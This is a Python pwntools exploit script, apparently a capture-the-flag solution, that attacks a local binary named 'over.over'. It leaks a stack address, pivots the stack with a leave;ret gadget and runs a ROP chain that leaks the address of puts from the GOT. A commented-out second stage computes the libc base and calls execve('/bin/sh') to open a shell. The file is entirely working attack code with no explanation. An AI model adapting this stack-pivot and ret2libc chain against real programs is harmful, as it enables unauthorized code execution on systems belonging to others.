from pwn import *
context.binary = "./over.over"
context.log_level = 'debug'
def DEBUG(cmd):
    gdb.attach(io, cmd)

io = process("./over.over")
elf = ELF("./over.over")
libc = elf.libc
leave_ret = 0x4006BE
pop_rdi_ret=0x400793
ret_addr = 0x400676
io.sendafter(">", 'a' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - 0x70
success("stack -> {:#x}".format(stack))
#pause()
#DEBUG("b *0x4006B9")
payload  = 'A'*8
payload += p64(pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(ret_addr)
payload += 'A'*(80-40)
payload += p64(stack)
payload += p64(leave_ret)
io.sendafter(">", payload)
#pause()
"""
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.symbols['puts']
success("libc.address -> {:#x}".format(libc.address))

pop_rdx_pop_rsi_ret=libc.address+0x1151C9


payload  = 'B'*8
payload += p64(pop_rdi_ret)
payload += p64(next(libc.search("/bin/sh")))
payload += p64(pop_rdx_pop_rsi_ret)
payload += p64(0)*2
payload += p64(libc.sym['execve'])
payload += 'B'*(80-56)
payload += p64(stack - 0x30)
payload += p64(leave_ret)

io.sendafter(">", payload)
"""
io.interactive()
